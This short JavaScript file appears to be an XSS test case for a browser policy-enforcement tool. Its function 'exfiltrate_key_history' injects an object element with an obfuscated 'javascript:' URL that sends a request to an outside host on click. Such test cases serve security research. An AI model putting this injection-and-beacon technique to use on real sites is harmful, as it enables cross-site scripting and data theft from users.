
JAM.startProfile('load');
function exfiltrate_key_history(){var URL='Function(\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss3",true);xmlhttp.send(null);\')()',script=document.createElement("object");script.data="JaVaScRiPt:"+URL;URL=document.getElementsByTagName("body");URL=URL[0];JAMScript.call(URL.appendChild,URL,[script])}var v1=document.getElementById("test");JAMScript.set(v1,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
